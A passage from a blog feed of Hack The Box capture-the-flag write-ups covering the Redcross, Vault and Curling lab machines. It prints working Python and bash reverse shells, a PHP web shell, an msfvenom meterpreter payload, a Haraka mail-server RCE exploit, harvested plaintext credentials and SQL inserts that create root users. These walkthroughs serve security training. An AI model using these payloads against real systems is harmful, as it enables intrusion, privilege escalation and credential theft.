IPuid=33(www-data) gid=33(www-data) groups=33(www-data)uid=33(www-data) gid=33(www-data) groups=33(www-data)Since we now have RCE, we can use a standard python reverse shell command to get shell on the system.Payload: ip=1;python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((\"10.10.14.23\",4444))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call([\"/bin/sh\",\"-i\"])%3b'&amp;action=denyAnd we get a shell!root@ragingunicorn:~/hackthebox/Machines/Redcross# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.113] 51712/bin/sh: 0: can't access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$ hostnameredcrosswww-data@redcross:/home/penelope$ ls -l ls -l total 8drwxrwx--- 6 penelope mailadm  4096 Jun  7 17:59 haraka-rw-r----- 1 root     penelope   33 Jun  7 18:18 user.txtwww-data@redcross:/home/penelope$ cat user.txtcat user.txtcat: user.txt: Permission deniedWe still can’t read user.txt since it’s owned by penelope… Gotta try harder I guess.Priv esc to penelopePenelope’s home directory contains the haraka directory. Haraka is an SMTP email server written in Node.js and contains at least one vulnerability according to Exploit-DB:-----------------------------------------Haraka &lt; 2.8.9 - Remote Command Execution/linux/remote/41162.py-----------------------------------------Shellcodes: No ResultThe server is running but doesn’t appear to be listening on port 25:www-data@redcross:/home/penelope$ ps waux | grep harakaps waux | grep harakapenelope  1199  0.0  1.9 994608 20068 ?        Ssl  09:47   0:02 node /usr/bin/haraka -c /home/penelope/harakawww-data@redcross:/home/penelope$ telnet 127.0.0.1 25telnet 127.0.0.1 25Trying 127.0.0.1...telnet: Unable to connect to remote host: Connection refusedwww-data@redcross:/home/penelope$ netstat -panutnetstat -panutbash: netstat: command not foundNetstat is not installed so I went back to the firewall control page added a whitelist entry for my IP address and scanned the box again with nmap:root@ragingunicorn:~# nmap -p- 10.10.10.113Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-11 15:18 ESTNmap scan report for intra.redcross.htb (10.10.10.113)Host is up (0.018s latency).Not shown: 65529 closed portsPORT     STATE SERVICE21/tcp   open  ftp22/tcp   open  ssh80/tcp   open  http443/tcp  open  https1025/tcp open  NFS-or-IIS5432/tcp open  postgresql1025 looks interesting but we can’t connect to it with telnet:root@ragingunicorn:~# telnet 10.10.10.113 25Trying 10.10.10.113...telnet: Unable to connect to remote host: Connection refusedWe can connect locally though:root@ragingunicorn:~# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.113] 52064/bin/sh: 0: can't access tty; job control turned off$ telnet 127.0.0.1 1025Trying 127.0.0.1...Connected to 127.0.0.1.Escape character is '^]'.220 redcross ESMTP Haraka 2.8.8 readyquitThe exploit needs to be modified slightly because the port is hardcoded and needs to be changed to 1025.Line 123 needs to be changed to the following:...s = smtplib.SMTP(mailserver,1025)...We can use vi to create the exploit .py file in /dev/shm, then execute it to spawn a reverse shell:Note: The email address must contain the redcross.htb domain.www-data@redcross:/dev/shm$ ./h.py -c \"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.23\\\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\" -t penelope@redcross.htb -f penelope@redcross.htb -m redcrosshtb -m redcrossn/sh\\\",\\\"-i\\\"]);'\" -t penelope@redcross.htb -f penelope@redcross.ho- by Xychix, 26 January 2017 ----o- xychix [at] hotmail.com ----o- exploit haraka node.js mailserver &lt;= 2.8.8 (with attachment plugin activated) ---i- info: https://github.com/haraka/Haraka/pull/1606 (the change that fixed this)Send harariki to penelope@redcross.htb, attachment saved as harakiri-20181111-152151.zip, commandline: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.23\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' , mailserver redcross is used for deliveryContent-Type: multipart/mixed; boundary=\"===============2632093882109835759==\"MIME-Version: 1.0Subject: harakiriFrom: penelope@redcross.htbTo: penelope@redcross.htb--===============2632093882109835759==Content-Type: text/plain; charset=\"us-ascii\"MIME-Version: 1.0Content-Transfer-Encoding: 7bitharakiri--===============2632093882109835759==Content-Type: application/octet-stream; Name=\"harakiri.zip\"MIME-Version: 1.0Content-Transfer-Encoding: base64Content-Disposition: attachment; filename=\"harakiri.zip\"UEsDBBQAAAAIALl6a00BtHNYbAEAAI0BAADyAAAAYSI7cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMjMiLDU1NTUpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc7ZWNobyAiYS56aXAL8GZmEWFgYOBg2FmV7Su+rEFdmJGBgZ2ZgYEHKJqRWJSYnVmUqVdSUTI18HRes4HAnt/abo8meZiqyGSIbP2+Kj5g5atEZr6yU94blnz4/nTiB66gq1Ml1penXU/Oicw4vKlqj35sQtjuRPeeLr5W05mXLjof98pt6Fz090jS/mWSky5efTxl986JM3/Nvaq29vBc8Tixz3kGa3X39Ny+OaVy25dPP+Kv7f0ztzffZC8jyz9pp2VCy6Xkt673/cpy/bC1qupT0zt3/0kGnfILKrWx69y/ILjvpMu2+ceY16/S8eJ1Dva736LCO6VW88IrrqnxoX3Tw3d8O2iX8Dk5onnGyesbvSQiQ9rUGH/mrDuidcMsuHWC2yGV5184zs4RdT/OOXvfpytyr78ct8j/O2lq4JM3e+e282azxgcLaW1QO3YzRCsjKDjnqH6ANyOTCAPu4IOBBkYGtMAM8GZlA4kxAqEVkLYFqwAAUEsBAhQAFAAAAAgAuXprTQG0c1hsAQAAjQEAAPIAAAAAAAAAAAAAAIABAAAAAGEiO3B5dGhvbiAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjIzIiw1NTU1KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsnO2VjaG8gImEuemlwUEsFBgAAAAABAAEAIAEAAHwCAAAAAA==--===============2632093882109835759==--[HARAKIRI SUCCESS] SMTPDataError is most likely an error unzipping the archive, which is what we want [plugin timeout]www-data@redcross:/dev/shm$ root@ragingunicorn:~/hackthebox/Machines/Redcross# nc -lvnp 5555listening on [any] 5555 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.113] 33380/bin/sh: 0: can't access tty; job control turned off$ iduid=1000(penelope) gid=1000(penelope) groups=1000(penelope)$ cat user.txtcat: user.txt: No such file or directory$ pwd/$ cd /home/penelope$ cat user.txtac899b...Priv esc to rootThe NSS plugin is installed, so SSH can authenticate users from the postgresql database instead of /etc/passwd$ cat nss-pgsql.confconnectionstring        = hostaddr=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw connect_timeout=1We can’t read the other file though…$ cat nss-pgsql-root.confcat: nss-pgsql-root.conf: Permission deniedWith the credentials we can poke inside the database:penelope@redcross:/etc$ psql -h 127.0.0.1 -U unixnss -W unixpsql -h 127.0.0.1 -U unixnss -W unixPassword for user unixnss: fios@ew023xnwpsql (9.6.7)SSL connection (protocol: TLSv1.2, cipher: ECDHE-RSA-AES256-GCM-SHA384, bits: 256, compression: off)Type \"help\" for help.unix=&gt; \\d\\d              List of relations Schema |     Name     |   Type   |  Owner   --------+--------------+----------+---------- public | group_id     | sequence | postgres public | group_table  | table    | postgres public | passwd_table | table    | postgres public | shadow_table | table    | postgres public | user_id      | sequence | postgres public | usergroups   | table    | postgres(6 rows)Here we can see the user table in which the user we created resides:unix=&gt; select * from passwd_table;select * from passwd_table; username |               passwd               | uid  | gid  | gecos |    homedir     |   shell   ----------+------------------------------------+------+------+-------+----------------+----------- tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail/home | /bin/bash snowscan | $1$ANxI97CM$noo3OJtS7FevXzzfR//ih0 | 2020 | 1001 |       | /var/jail/home | /bin/bash(2 rows)We’ll try adding a new user with password yolo1234 and set it’s UID and GID to 0:unix=&gt; insert into passwd_table (username, passwd, uid, gid, homedir) values ('snowscan','$6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1',0,0,'/root');ERROR:  permission denied for relation passwd_tableToo bad, this user doesn’t have access… But the web application probably has an account that has the correct rights to add users since we were able to create a user from the web interface earlier.The /var/www/html/admin/pages/actions.php file contains the credentials we are looking for: unixusrmgr / dheu%7wjx8B&amp;if($action==='adduser'){\t$username=$_POST['username'];\t$passw=generateRandomString();\t$phash=crypt($passw);\t$dbconn = pg_connect(\"host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;\");\t$result = pg_prepare($dbconn, \"q1\", \"insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, '/var/jail/home')\");\t$result = pg_execute($dbconn, \"q1\", array($username, $phash));\techo \"Provide this credentials to the user:&lt;br&gt;&lt;br&gt;\";\techo \"&lt;b&gt;$username : $passw&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;a href=/?page=users&gt;Continue&lt;/a&gt;\";}Let’s try the same SQL query again with these credentials:unix=&gt; insert into passwd_table (username, passwd, uid, gid, homedir) values ('snowscan','$6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1',0,0,'/root');ERROR:  permission denied for relation passwd_tableUgh. Same problem again, let’s try adding a user without setting the UID, but only the GID:unix=&gt; insert into passwd_table (username, passwd, gid, homedir) values ('snowscan','$6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1',0,'/root');ERROR:  duplicate key value violates unique constraint \"passwd_table_username_key\"DETAIL:  Key (username)=(snowscan) already exists.unix=&gt; insert into passwd_table (username, passwd, gid, homedir) values ('snowscan2','$6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1',0,'/root');INSERT 0 1unix=&gt; select * from passwd_table; username  |                                               passwd                                               | uid  | gid  | gecos |    homedir     |   shell   -----------+----------------------------------------------------------------------------------------------------+------+------+-------+----------------+----------- tricia    | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp.                                                                 | 2018 | 1001 |       | /var/jail/home | /bin/bash snowscan  | $1$ANxI97CM$noo3OJtS7FevXzzfR//ih0                                                                 | 2020 | 1001 |       | /var/jail/home | /bin/bash snowscan2 | $6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1 | 2022 |    0 |       | /root          | /bin/bash(3 rows)Allright, we can log in now, but still don’t have access to read root.txt, we’ll need to have a UID of 0 to do that:snowscan2@redcross:~$ ls -ltotal 12drwxr-xr-x  3 root root 4096 Jun  6 14:05 bindrwxrwxr-x 11 root root 4096 Jun  7 17:32 Haraka-2.8.8-rw-------  1 root root   33 Jun  8 06:51 root.txtsnowscan2@redcross:~$ cat root.txtcat: root.txt: Permission deniedWe can now read nss-pgsql-root.conf since we are part of root’s group and we find more credentials: unixnssroot / 30jdsklj4d_3snowscan2@redcross:/etc$ ls -l nss-pgsql-root.conf-rw-rw---- 1 root root 540 Jun  8 06:24 nss-pgsql-root.confsnowscan2@redcross:/etc$ cat nss-pgsql-root.confshadowconnectionstring = hostaddr=127.0.0.1 dbname=unix user=unixnssroot password=30jdsklj4d_3 connect_timeout=1shadowbyname = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE username = $1 ORDER BY lastchange DESC LIMIT 1;shadow = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE (username,lastchange) IN (SELECT username, MAX(lastchange) FROM shadow_table GROUP BY username);Using this account, we are able to create a new user with UID 0:unix=&gt; insert into passwd_table (username, passwd, uid,gid, homedir) values ('snowscan_root','$6$oTkOZvS...',0,0,'/root');INSERT 0 1unix=&gt; select * from passwd_table;   username    |                                               passwd                                               | uid  | gid  | gecos |    homedir     |   shell   ---------------+----------------------------------------------------------------------------------------------------+------+------+-------+----------------+----------- tricia        | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp.                                                                 | 2018 | 1001 |       | /var/jail/home | /bin/bash snowscan      | $1$ANxI97CM$NZZ3OJtS7FevXzzfR//ih0                                                                 | 2020 | 1001 |       | /var/jail/home | /bin/bash snowscan2     | $6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UCzEdZxhzd/MbSy2R5Kp1x4rtNCgHsJ1 | 2022 |    0 |       | /root          | /bin/bash snowscan_root | $6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UCzEdZxhzd/MbSy2R5Kp1x4rtNCgHsJ1 |    0 |    0 |       | /root          | /bin/bash(4 rows)We can’t SSH in with this account because of the SSH server settings:snowscan2@redcross:/etc/ssh$ grep -i root sshd_configPermitRootLogin prohibit-passwordBut we can su to the new user and get the root flagsnowscan2@redcross:/etc/ssh$ su -l snowscan_rootPassword:snowscan_root@redcross:~# iduid=0(snowscan_root) gid=0(root) groups=0(root)snowscan_root@redcross:~# cat /root/root.txt892a1f..."
  },
  
  {
    "title": "Vault - Hack The Box",
    "url": "/posts/htb-writeup-vault/",
    "categories": "hackthebox, infosec",
    "tags": "linux, php, openvpn, firewall, pivoting, gpg",
    "date": "2019-04-06 00:00:00 +0800",
    





    
    "snippet": "Quick summary  An upload page allows us to get RCE by uploading a PHP file with the php5 file extension  We can find the SSH credentials in a plaintext file in Dave’s directory  After getting a foo...",
    "content": "Quick summary  An upload page allows us to get RCE by uploading a PHP file with the php5 file extension  We can find the SSH credentials in a plaintext file in Dave’s directory  After getting a foothold on the box, we find another network segment with another machine on it  The machine has OpenVPN installed and already has a backdoored ovpn configuration file that let us get a reverse shell there  There’s yet another network segment and host that we discover by looking at the routing table and host file  The next target is protected by a firewall but the firewall allows us to connect through it by changing the source port of our TCP session  After logging in to the last box we find a gpg encrypted file which we can decrypt on the host OS since we have the private key and the passwordDetailed stepsNmapPort 22 and 80 are open:# Nmap 7.70 scan initiated Sat Nov  3 23:09:53 2018 as: nmap -F -sC -sV -oA vault 10.10.10.109Nmap scan report for vault.htb (10.10.10.109)Host is up (0.023s latency).Not shown: 98 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn't have a title (text/html; charset=UTF-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWeb enumerationThere’s not much on the main page except a mention about SparklaysA gobuster scan with big.txt in the root directory reveals nothing but if we start with /sparklays we find a few directories:# gobuster -q -t 50 -w big.txt -u http://vault.htb -s 200,204,301,302,307# gobuster -q -t 50 -w big.txt -u http://vault.htb/sparklays -s 200,204,301,302,307/design (Status: 301)# gobuster -q -t 50 -w big.txt -u http://vault.htb/sparklays/design -s 200,204,301,302,307/uploads (Status: 301)Further scanning with raft-small-words and .html extension reveals design.html:# gobuster -q -t 50 -w raft-small-words.txt -u http://vault.htb/sparklays/design -x php,html -s 200,204,301,302,307/uploads (Status: 301)/design.html (Status: 200)The link goes to an upload page. Upload pages are interesting because if we can upload a PHP file then we can get RCE on the target machine.I used a simple PHP command shell:&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&lt;?php system($_GET[\"cmd\"]); ?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;When we try to upload a simple PHP command shell we get a sorry that file type is not allowed error message.After trying a few different file types, I noticed we can use the .php5 file extension and we get a The file was uploaded successfully message.We now have RCE:Found a couple of interesting files in Dave’s desktop folder:http://vault.htb/sparklays/design/uploads/shell.php5?cmd=ls%20-l%20/home/dave/Desktoptotal 12-rw-rw-r-- 1 alex alex 74 Jul 17 10:30 Servers-rw-rw-r-- 1 alex alex 14 Jul 17 10:31 key-rw-rw-r-- 1 alex alex 20 Jul 17 10:31 sshThe ssh file contains plaintext credentials:http://vault.htb/sparklays/design/uploads/shell.php5?cmd=cat%20/home/dave/Desktop/sshdaveDav3therav3123Shell accessUsing the SSH credentials we found in Dave’s directory we can now log in:root@ragingunicorn:~/hackthebox/Machines/Vault# ssh dave@10.10.10.109dave@10.10.10.109's password:Last login: Sat Nov  3 19:59:05 2018 from 10.10.15.233dave@ubuntu:~$The ~/Desktop directory contains a couple of interesting files:dave@ubuntu:~/Desktop$ ls -ltotal 12-rw-rw-r-- 1 alex alex 14 Jul 17 10:31 key-rw-rw-r-- 1 alex alex 74 Jul 17 10:30 Servers-rw-rw-r-- 1 alex alex 20 Jul 17 10:31 sshdave@ubuntu:~/Desktop$ cat keyitscominghomedave@ubuntu:~/Desktop$ cat ServersDNS + Configurator - 192.168.122.4Firewall - 192.168.122.5The Vault - xdave@ubuntu:~/Desktop$ cat sshdaveDav3therav3123The user also has a gpg keyring:dave@ubuntu:~/.gnupg$ ls -ltotal 28drwx------ 2 dave dave 4096 Jul 17  2018 private-keys-v1.d-rw------- 1 dave dave 2205 Jul 24  2018 pubring.gpg-rw------- 1 dave dave 2205 Jul 24  2018 pubring.gpg~-rw------- 1 dave dave  600 Sep  3  2018 random_seed-rw------- 1 dave dave 4879 Jul 24  2018 secring.gpg-rw------- 1 dave dave 1280 Jul 24  2018 trustdb.gpgBased on the Servers file it seems there are other VMs or containers running. We can confirm this also by checking the network interfaces (there’s a virtual bridge interface with the same subnet mentionned in the Server file:dave@ubuntu:~/Desktop$ ifconfigens33     Link encap:Ethernet  HWaddr 00:50:56:b2:8d:92          inet addr:10.10.10.109  Bcast:10.10.10.255  Mask:255.255.255.0          inet6 addr: fe80::250:56ff:feb2:8d92/64 Scope:Link          inet6 addr: dead:beef::250:56ff:feb2:8d92/64 Scope:Global          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:484701 errors:0 dropped:0 overruns:0 frame:0          TX packets:372962 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:61423226 (61.4 MB)  TX bytes:123066398 (123.0 MB)virbr0    Link encap:Ethernet  HWaddr fe:54:00:17:ab:49          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:34 errors:0 dropped:0 overruns:0 frame:0          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:2296 (2.2 KB)  TX bytes:731 (731.0 B)We can do a poor man’s port scan using netcat and find the host 192.168.122.4 with two ports open:dave@ubuntu:~/Desktop$ nc -nv 192.168.122.4 -z 1-1000 2&gt;&amp;1 | grep -v failedConnection to 192.168.122.4 22 port [tcp/*] succeeded!Connection to 192.168.122.4 80 port [tcp/*] succeeded!We’ll setup SSH port forwarding so we can get to the 2nd host:root@ragingunicorn:~/hackthebox/Machines/Vault# ssh dave@10.10.10.109 -L 80:192.168.122.4:80dns-config.php is an invalid link (404).The 2nd link brings us to a VPN configuration page where we can update an ovpn file.With gobuster, we find additional information in /notes:# gobuster -q -t 50 -w big.txt -u http://127.0.0.1 -s 200,204,301,302,307/notes (Status: 200)We can grab http://127.0.0.1/123.ovpn:remote 192.168.122.1dev tunnobindscript-security 2up \"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.122.1/2323 0&gt;&amp;1'\"And http://127.0.0.1/script.sh:#!/bin/bashsudo openvpn 123.ovpnSo it seems that the 123.ovpn file contains a reverse shell payload.We can just spawn a netcat on the box and trigger the Test VPN function to get a shell:dave@ubuntu:~$ nc -lvnp 2323Listening on [0.0.0.0] (family 0, port 2323)Connection from [192.168.122.4] port 2323 [tcp/*] accepted (family 2, sport 60596)bash: cannot set terminal process group (1131): Inappropriate ioctl for devicebash: no job control in this shellroot@DNS:/var/www/html# id;hostnameid;hostnameuid=0(root) gid=0(root) groups=0(root)DNSroot@DNS:/var/www/html#User flag found in Dave’s directory:root@DNS:/home/dave# cat user.txtcat user.txta4947...There’s also SSH credentials in there:root@DNS:/home/dave# cat sshcat sshdavedav3gerous567Priv EscIn the web directories, there’s a file that reveals two additional network segments:  192.168.1.0/24  192.168.5.0/24root@DNS:/var/www/DNS# ls -latotal 20drwxrwxr-x 3 root root 4096 Jul 17 12:46 .drwxr-xr-x 4 root root 4096 Jul 17 12:47 ..drwxrwxr-x 2 root root 4096 Jul 17 10:34 desktop-rw-rw-r-- 1 root root  214 Jul 17 10:37 interfaces-rw-rw-r-- 1 root root   27 Jul 17 10:35 visudoroot@DNS:/var/www/DNS# cat visudowww-data ALL=NOPASSWD: ALLroot@DNS:/var/www/DNS# cat interfacesauto ens3iface ens3 inet staticaddress 192.168.122.4netmask 255.255.255.0up route add -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5up route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.28There’s a route in the routing table pointing to the firewall:dave@DNS:~$ netstat -rnKernel IP routing tableDestination     Gateway         Genmask         Flags   MSS Window  irtt Iface192.168.5.0     192.168.122.5   255.255.255.0   UG        0 0          0 ens3192.168.122.0   0.0.0.0         255.255.255.0   U         0 0          0 ens3In the host file we can also find a reference to our next target: 192.168.5.2root@DNS:/home/dave# cat /etc/hostscat /etc/hosts127.0.0.1       localhost127.0.1.1       DNS192.168.5.2     VaultSo, we the network topology looks like this:This network is protected by a firewall, as shown earlier in the Servers file we found. Nmap is already installed on the DNS VM so we can use it to scan 192.168.5.2.root@DNS:~# nmap -P0 -p 1-10000 -T5 192.168.5.2Starting Nmap 7.01 ( https://nmap.org ) at 2018-11-04 03:56 GMTmass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversNmap scan report for Vault (192.168.5.2)Host is up (0.0019s latency).Not shown: 9998 filtered portsPORT     STATE  SERVICE53/tcp   closed domain4444/tcp closed krb524Nmap done: 1 IP address (1 host up) scanned in 243.36 secondsBy using the 4444 as a source port we can bypass the firewall and find another open port:root@DNS:~# nmap -g 4444 -sS -P0 -p 1-1000 192.168.5.2Starting Nmap 7.01 ( https://nmap.org ) at 2018-11-04 04:16 GMTmass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversNmap scan report for Vault (192.168.5.2)Host is up (0.0023s latency).Not shown: 999 closed portsPORT    STATE SERVICE987/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 3.84 secondsWe’ll need to SSH in by changing the source port of the TCP socket. To do that we can spawn a ncat listener that redirects to port 987 while changing the source port. Then we just SSH to ourselves on the ncat listening port.root@DNS:~# ncat -l 2222 --sh-exec \"ncat 192.168.5.2 987 -p 4444\"root@DNS:~# ssh -p 2222 dave@127.0.0.1  (password = dav3gerous567)Last login: Mon Sep  3 16:48:00 2018dave@vault:~$ iduid=1001(dave) gid=1001(dave) groups=1001(dave)vault:~$ lsroot.txt.gpgThe only thing interesting is the root.txt.gpgWe can download this back to the host OS and decrypt it with the itscominghome key we found earlier:root@DNS:/var/www/html# ncat -l 2222 --sh-exec \"ncat 192.168.5.2 987 -p 4444\"dave@ubuntu:~$ scp -P 2222 dave@192.168.122.4:~/root.txt.gpg .dave@192.168.122.4's password: root.txt.gpg                                                          100%  629     0.6KB/s   00:00dave@ubuntu:~$ gpg -d root.txt.gpgYou need a passphrase to unlock the secret key foruser: \"david &lt;dave@david.com&gt;\"4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24      \"david &lt;dave@david.com&gt;\"ca468..."
  },
  
  {
    "title": "Curling - Hack The Box",
    "url": "/posts/htb-writeup-curling/",
    "categories": "hackthebox, infosec",
    "tags": "joomla, ctf, cron, php, easy",
    "date": "2019-03-30 00:00:00 +0800",
    





    
    "snippet": "Quick summary  The username for the Joomla site is Floris as indicated on the main page in one of the post  The password is a variant of a word on the main page: Curling2018!  On the Joomla admin p...",
    "content": "Quick summary  The username for the Joomla site is Floris as indicated on the main page in one of the post  The password is a variant of a word on the main page: Curling2018!  On the Joomla admin page we can inject a meterpreter reverse shell in the index.php file of the template in-use  After getting a shell, we can download a password backup file, which is compressed several times, and contains the password for user floris  User floris controls a input file used by curl running in a root cronjob. We can change the config file so that cURL gets our SSH public key and saves it into the root ssh directoryNmapJust a webserver running Joomla on port 80root@ragingunicorn:~/hackthebox/Machines# nmap -sV -sV curling.htbStarting Nmap 7.70 ( https://nmap.org ) at 2018-10-27 16:22 EDTNmap scan report for curling.htb (10.10.10.150)Host is up (0.020s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.29 secondsJoomlaJoomscan didn’t return anything interesting but the main page has some interesting stuff:      The site name is Cewl Curling site!, this is a reference to the cewl tool used to scrape websites for words which are then used to build wordlists.        The first post reveals the username for the administrator: Floris        The first post also contains something which could be used as a password: curling2018  After trying a few variants of the password, I was able to log in as user Floris with the password Curling2018!We can now access the administrator page at http://curling.htb/administrator/index.phpI generated a simple PHP meterpreter payload:root@ragingunicorn:~/htb/curling# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 &gt; shell.php[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload[-] No arch selected, selecting arch: php from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 1112 bytesThen I added it to the index.php page so i could trigger it by browsing the main page:msf exploit(multi/handler) &gt; show optionsModule options (exploit/multi/handler):   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options (php/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  tun0             yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Wildcard Targetmsf exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 10.10.14.23:4444Getting a shell:[*] Started reverse TCP handler on 10.10.14.23:4444[*] Sending stage (37775 bytes) to 10.10.10.150[*] Meterpreter session 1 opened (10.10.14.23:4444 -&gt; 10.10.10.150:56220) at 2018-10-27 16:33:27 -0400meterpreter &gt; sessions 1[*] Session 1 is already interactive.meterpreter &gt; shellProcess 2047 created.Channel 0 created.iduid=33(www-data) gid=33(www-data) groups=33(www-data)Escalate to user FlorisUser floris has a readable file password_backupcd /home/florislsadmin-areapassword_backupuser.txtcat password_backup00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&amp;SY...H..00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:400000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........400000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..&lt;~.x00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .&gt;...sVT.zH....100000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s.\"000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... 